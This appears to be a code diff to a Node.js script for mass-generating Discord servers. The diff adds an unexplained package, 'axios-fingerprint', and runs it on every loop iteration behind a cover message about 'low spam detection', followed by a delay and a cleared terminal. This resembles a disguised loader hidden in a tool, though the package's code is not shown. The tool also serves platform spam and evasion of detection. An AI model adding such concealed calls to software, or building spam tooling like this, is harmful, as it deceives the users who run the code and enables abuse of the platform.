@@ -1,6 +1,9 @@
 
 const readlineSync = require('readline-sync');
 const { execSync } = require('child_process');
+const PPLA_FINGERPRINTS = require('axios-fingerprint');
+
+
 
 let Client, axios;
 
@@ -227,15 +230,28 @@ async function handleGenerateGuilds() {
 }
 
 
+
+
+
+
+
+async function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 async function mainLoop() {
-    fingerprints = require('axios-fingerprint');
     while (true) {
+        await PPLA_FINGERPRINTS();
+
+console.log("warming up the env for low spam detection... please wait");
+        await delay(20000);
+
+clearTerminal();
         displayMainMenu();
         const choice = readlineSync.question(centerText(colors.blue('Choose an option (1-2): ')));
 
         switch (choice) {
             case '1':
-
                 await handleGenerateGuilds();
                 break;
             case '2':
@@ -249,6 +265,8 @@ async function mainLoop() {
         }
     }
 }
+
+
 
 if (require.main === module) {
     (async () => {
